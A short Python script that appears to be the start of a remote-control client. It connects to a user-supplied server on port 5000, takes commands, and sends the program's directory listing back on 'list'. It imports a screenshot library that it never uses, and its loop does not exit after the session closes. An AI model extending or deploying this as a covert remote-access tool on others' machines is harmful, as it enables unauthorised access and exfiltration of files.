import os
import socket
import pyscreenshot

# Connect to server
sock = socket.socket()
host = input(str("Input server address: ")) # To automatically connect, port foward and assign to the host
port = 5000

try:
    sock.connect((host, port))
    print("Success: connected to server")
except OSError:
    print("Host not found")

# Commands
ss_num = 0

while True:
    command = sock.recv(1024)
    command = command.decode()

    if command == "list": # Show files in root (program's) directory
        files = os.listdir()
        sock.send(str(files).encode())
    
    if command == "endsession":
        sock.close()